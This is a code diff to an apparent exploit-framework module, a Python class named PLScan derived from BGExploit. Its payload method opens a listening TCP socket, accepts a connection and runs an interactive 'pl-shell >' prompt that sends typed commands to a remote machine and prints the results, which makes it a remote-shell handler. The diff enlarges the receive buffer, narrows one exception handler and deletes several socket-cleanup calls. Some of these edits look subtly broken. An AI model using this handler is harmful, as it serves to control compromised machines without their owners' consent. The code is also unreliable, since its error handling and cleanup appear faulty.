@@ -96,7 +96,7 @@ class PLScan(BGExploit):
     def payload(self):
         HOST   = self.option.target['default']
         PORT   = self.option.port['default']
-        BUFSIZ = 2048
+        BUFSIZ = 4096
         ADDR   = (HOST, PORT)
         sock   = socket(AF_INET, SOCK_STREAM)
         sock.bind(ADDR)
@@ -111,9 +111,6 @@ class PLScan(BGExploit):
                 except (KeyboardInterrupt):
                     tcpClientSock.close()
                     sock.close()
-                finally:
-                    tcpClientSock.close()
-                    sock.close()
                 print('Start Listening %s  port %s.....') %(addr,PORT)
                 while True:
                     data = raw_input('pl-shell >')
@@ -122,16 +119,13 @@ class PLScan(BGExploit):
                         if data.upper()=="BACK":
                             break
                         os_result = tcpClientSock.recv(BUFSIZ)
-                    except:
+                    except socket.timeout:
                         tcpClientSock.close()
                         break
                     STOP_CHAT = (data.decode('utf8').upper()=="QUIT")
                     if STOP_CHAT:
                         break
                     print(os_result)
-
-            tcpClientSock.close()
-            sock.close()
         except (KeyboardInterrupt):
             tcpClientSock.close()
             sock.close()
